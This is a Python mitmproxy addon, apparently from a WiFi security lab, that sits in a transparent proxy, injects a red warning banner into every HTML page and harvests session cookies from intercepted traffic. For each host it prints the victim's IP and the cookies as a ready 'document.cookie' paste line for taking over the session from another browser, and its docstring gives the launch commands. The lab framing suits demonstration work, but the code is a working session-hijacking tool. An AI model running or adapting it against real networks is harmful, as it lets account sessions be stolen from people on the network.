#!/usr/bin/env python3
"""
Enterprise WiFi Lab — Active injection + session hijacking demo addon.

Two effects, one addon:

1. INJECTS a visible red banner into every HTML response, proving that the
   AP operator can not only OBSERVE but also MODIFY content the browser
   renders, even on HTTPS — once the CA is trusted on the client.

2. LOGS session-establishing events tagged with [SESSION]:
   - [SESSION] LOGIN DETECTED — emitted whenever a response sets a
     persistent cookie (i.e. the server is binding state to the client).
     The Paste-able combines existing request cookies with the new ones.
   - [SESSION] EXISTING COOKIES — emitted on the FIRST cookie-bearing
     request per host. Captures users who were already logged in before
     the injection was enabled, without relying on cookie-name heuristics.

REQUIRES: mitmproxy CA must be trusted on the client device (Demo B). Without
          a trusted CA the browser rejects the TLS handshake and no HTML
          response ever reaches the addon.

Usage via lab helper:
  sudo ./mitm-control.sh inject on
  sudo journalctl -u enterprise.service -f --no-pager | grep -E '\\[INJECT\\]|\\[SESSION\\]'

Or manually:
  sudo mitmdump --mode transparent --showhost --listen-port 8080 \\
                --listen-host 0.0.0.0 --set tls_version_client_min=TLS1_2 \\
                -s /path/to/mitm_inject_banner.py
"""

import re
from mitmproxy import http

# ---------------------------------------------------------------------------
# Banner — pure HTML/CSS/JS, injected just before </body> on every HTML page.
# Pinned at the top of the viewport with high z-index so it overlays anything.
# Does NOT contain the literal "</body>" string (would confuse re-injection).
# ---------------------------------------------------------------------------
BANNER_HTML = b"""
<div id="__lab_mitm_banner__" style="
  position:fixed;top:8px;left:50%;transform:translateX(-50%);
  z-index:2147483647;width:max-content;max-width:90vw;
  background:#cc0000;color:#fff;padding:8px 16px;
  font-family:-apple-system,system-ui,sans-serif;font-size:13px;
  font-weight:bold;text-align:center;
  border-radius:6px;box-shadow:0 2px 8px rgba(0,0,0,.35);">
  &#9888; MODIFICADO por <span style="font-family:monospace">CorpNet-Enterprise</span>
</div>
<script>
  (function(){
    try {
      console.warn("[MITM-LAB] Banner injected by AP operator. " +
                   "If you can read this, your TLS trust was bypassed.");
    } catch(e) {}
  })();
</script>
"""

# Content types whose body will receive the banner. Match the prefix so
# "text/html; charset=utf-8" also qualifies.
INJECT_TYPES = ("text/html",)

# Regex used to insert the banner before the closing </body> tag.
# Falls back to appending at the end of the body if </body> isn't found.
BODY_CLOSE_RE = re.compile(rb"</body\s*>", re.IGNORECASE)

# Hosts whose first cookie-bearing request has already been logged. Keeps the
# [EXISTING COOKIES] event to a single emission per host per mitmproxy run so
# the log stays readable even on heavy SPA traffic.
_SEEN_HOSTS_WITH_COOKIES: set[str] = set()


def _is_persistent_set_cookie(set_cookie_value: str) -> bool:
    """Return True if the Set-Cookie will actually persist on the client.
    Excludes deletion cookies (Max-Age=0 or Expires in the past)."""
    lower = set_cookie_value.lower()
    if "max-age=0" in lower or "max-age=-" in lower:
        return False
    # Conventional "delete this cookie" expiry sent by every framework.
    if "expires=thu, 01 jan 1970" in lower:
        return False
    return True


def _emit_hijack_event(tag: str, host: str, src_ip: str, cookie_string: str,
                       extra: str = "") -> None:
    print(
        f"\n{'='*60}\n"
        f"[SESSION] {tag} at {host}\n"
        f"[SESSION] Source IP : {src_ip}\n"
        + (f"[SESSION] {extra}\n" if extra else "")
        + f"[SESSION] Cookie    : {cookie_string}\n"
        f"[SESSION] Paste-able: document.cookie = '{cookie_string}';\n"
        f"{'='*60}"
    )


# ---------------------------------------------------------------------------
# Cookie capture — request side: snapshot the FIRST cookie-bearing request
# per host so we can hijack users who were already logged in before the
# injection was enabled.
# ---------------------------------------------------------------------------
def request(flow: http.HTTPFlow) -> None:
    cookie_header = flow.request.headers.get("cookie", "")
    if not cookie_header:
        return

    host = flow.request.pretty_host
    if host in _SEEN_HOSTS_WITH_COOKIES:
        return
    _SEEN_HOSTS_WITH_COOKIES.add(host)

    src_ip = flow.client_conn.peername[0] if flow.client_conn.peername else "?"
    _emit_hijack_event("EXISTING COOKIES", host, src_ip, cookie_header)


# ---------------------------------------------------------------------------
# Banner injection — runs on every response, modifies HTML bodies
# ---------------------------------------------------------------------------
def response(flow: http.HTTPFlow) -> None:
    host = flow.request.pretty_host

    # LOGIN detection: any persistent Set-Cookie means the server is binding
    # state to the client. Combine existing request cookies + the new ones
    # the response is about to set so the Paste-able is complete and ready
    # to hijack from a clean browser.
    new_cookies: list[tuple[str, str]] = []
    for set_cookie in flow.response.headers.get_all("set-cookie"):
        if not _is_persistent_set_cookie(set_cookie):
            continue
        head = set_cookie.split(";", 1)[0]
        if "=" not in head:
            continue
        name, _, value = head.partition("=")
        new_cookies.append((name.strip(), value.strip()))

    if new_cookies:
        combined: dict[str, str] = {}
        existing = flow.request.headers.get("cookie", "")
        for pair in existing.split(";"):
            if "=" in pair:
                n, _, v = pair.strip().partition("=")
                combined[n] = v
        for name, value in new_cookies:
            combined[name] = value
        cookie_string = "; ".join(f"{n}={v}" for n, v in combined.items())
        src_ip = flow.client_conn.peername[0] if flow.client_conn.peername else "?"
        names = ", ".join(n for n, _ in new_cookies)
        _emit_hijack_event(
            "LOGIN DETECTED", host, src_ip, cookie_string,
            extra=f"Set      : {names}",
        )
        # After a fresh login we want any future request-side snapshot for
        # this host to reflect the new state; drop it from the seen set.
        _SEEN_HOSTS_WITH_COOKIES.discard(host)

    # Banner injection: only on text/html responses with a body.
    content_type = flow.response.headers.get("content-type", "").lower()
    if not any(ct in content_type for ct in INJECT_TYPES):
        return

    # Skip non-2xx responses to avoid rewriting error pages incorrectly.
    if not (200 <= flow.response.status_code < 300):
        return

    body = flow.response.get_content()
    if not body:
        return

    # Idempotency: if our banner is already in the body, don't re-inject.
    if b"__lab_mitm_banner__" in body:
        return

    # Inject just before </body>; if not present, append to end.
    new_body, count = BODY_CLOSE_RE.subn(BANNER_HTML + b"</body>", body, count=1)
    if count == 0:
        new_body = body + BANNER_HTML

    flow.response.set_content(new_body)
    print(
        f"[INJECT] {flow.request.pretty_host}{flow.request.path} "
        f"— banner injected ({len(body)} → {len(new_body)} bytes)"
    )
